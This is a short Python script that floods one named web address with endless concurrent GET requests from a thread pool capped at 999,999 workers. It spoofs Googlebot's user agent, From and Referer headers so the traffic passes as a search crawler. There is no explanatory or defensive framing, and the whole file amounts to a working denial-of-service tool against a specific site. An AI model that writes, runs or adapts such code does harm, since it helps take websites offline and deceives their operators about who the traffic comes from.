import requests
import time
import concurrent.futures
def query():
    url = "https://ssidollars.pythonanywhere.com/awards/"
    wait_time = 1
    while True:
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": "https://www.google.com/",
                "From": "googlebot(at)googlebot.com",
                "Connection": "keep-alive"
                            }
            response = requests.get(url, headers=headers)
            if response.ok:
                print("bye")
                return True
        except requests.exceptions.RequestException as e:
            time.sleep(wait_time)
            wait_time *= 2
with concurrent.futures.ThreadPoolExecutor(max_workers=999999) as executor:
    while True:
        try:
            executor.submit(query)
        except Exception as e:
            print(f"ERROR:{e}")
